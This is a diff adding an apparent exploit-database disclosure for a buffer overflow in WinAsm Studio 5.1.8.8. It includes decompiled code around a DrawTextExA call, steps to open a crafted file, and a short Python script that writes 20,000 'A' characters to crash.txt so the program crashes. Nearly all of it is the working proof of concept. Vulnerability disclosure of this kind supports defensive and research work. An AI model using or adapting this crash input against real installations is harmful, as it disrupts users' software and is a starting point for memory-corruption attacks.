@@ -1,0 +1,36 @@
+********************************************************************************************
+# Exploit: WinAsm Studio 5.1.8.8 BOF. 
+# Date: 12/6/2015
+# Exploit Author: Un_N0n
+# Vendor: WinAsm
+# Software Link: http://www.winasm.net/winasm-studio-updates.html
+# Version: 5.1.8.8
+# Tested on: Windows 7 x64(64bit)
+********************************************************************************************
+[Info]
+
+Code: 
+rc.right = 0;
+rc.bottom = 0;
+  DrawTextExA(
+    hdc,
+    L"I \t\u6e69\u6c63\u6475e\u6e69\.................\uf64)", <--- XXXtremely big string to draw, thus crashes.
+    1,
+    &rc,
+    0x2CE0u,
+    &dtp);
+*(_DWORD *)(a1 + 420) = rc.right;
+
+
+[How to?]
+1 - Open up WinAsm.exe.
+2 - GoTo Files -> Open Files.
+3 - Browser the crash.txt in it.
+~ Software will Crash.
+
+[crash.txt?]
+file = open('crash.txt','w')
+file.write("A"*20000)       #Crash.txt Contains 20000s As
+file.close()
+
+********************************************************************************************
